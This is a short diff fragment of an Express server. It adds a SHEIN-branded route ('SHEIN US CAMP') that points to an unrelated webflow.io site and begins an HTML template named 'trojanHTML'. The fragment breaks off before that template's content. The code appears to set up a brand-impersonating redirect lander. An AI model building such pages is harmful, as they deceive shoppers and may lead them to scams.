@@ -9,7 +9,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Middleware to pass on my slug values (SHEIN US CAMP)
 app.get('/shein/:slug', (req, res, next) => {
     const { slug } = req.params;
-    const destinationLander = `SHEIN US LANDING PAGE`;
+    const destinationLander = `https://lisalbournfash4u2022.webflow.io/`;
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
